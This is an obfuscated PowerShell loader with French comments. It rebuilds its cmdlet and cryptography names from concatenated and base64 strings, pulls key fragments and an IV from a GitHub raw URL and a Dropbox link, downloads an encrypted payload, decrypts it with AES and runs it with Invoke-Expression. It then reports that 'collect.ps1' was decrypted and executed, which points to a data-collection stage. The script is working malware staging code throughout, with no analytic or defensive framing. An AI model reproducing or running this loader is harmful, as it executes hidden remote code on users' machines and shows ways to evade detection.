
# --- Obfuscation avancée ---
$a1 = 'https://raw.github'; $a2 = 'usercontent.com/m1d0b4n/j4g4n/refs/heads/main/e_data/';
$b1 = 'https://www.dropbox.com/scl/fi/zebskodmwmsak01fgg0a2/'; $b2 = 'c_config_3.txt?rlkey=ef3mkyrqpe5bb7y6i0198kjxr&st=ejgf3q6h&dl=1';
$l = @{
    "enc" = $a1+$a2+"c.m1d0b4n"
    "c1"  = $a1+$a2+"c_config_1.txt"
    "c2"  = $a1+$a2+"c_config_2.txt"
    "c3"  = $b1+$b2
    "iv"  = $a1+$a2+"c_i_theme.txt"
}

# Alias et dynamiques
$irm = ('Invo'+'ke-RestMethod')
$iex = ('Invo'+'ke-Expression')
$b64 = ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbUJhc2U2NFN0cmluZw==')))
$aes = ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5BZXM=')))

function gR($u) { & $irm -Uri $u }

$f1 = [Convert]::$b64((gR $l.c1))
$f2 = [Convert]::$b64((gR $l.c2))
$f3 = [Convert]::$b64((gR $l.c3))
$iv = [Convert]::$b64((gR $l.iv))

$k = New-Object byte[] ($f1.Length+$f2.Length+$f3.Length)
[Array]::Copy($f1,0,$k,0,$f1.Length)
[Array]::Copy($f2,0,$k,$f1.Length,$f2.Length)
[Array]::Copy($f3,0,$k,$f1.Length+$f2.Length,$f3.Length)

$e_b64 = gR $l.enc
$e_bytes = [Convert]::$b64($e_b64)

$A = [Reflection.Assembly]::LoadWithPartialName($aes).CreateInstance($aes)
$A.Mode = ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q0JD')))
$A.Padding = ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UEtDUzc=')))
$A.Key = $k
$A.IV = $iv
$D = $A.('CreateDecryptor')()
$plain_bytes = $D.('TransformFinalBlock')($e_bytes,0,$e_bytes.Length)
$A.('Dispose')()
$pl = [Text.Encoding]::UTF8.GetString($plain_bytes)

# --- Exécution dynamique du script PowerShell déchiffré (collect.ps1) ---
&$iex $pl

Write-Host "[+] collect.ps1 déchiffré et exécuté."
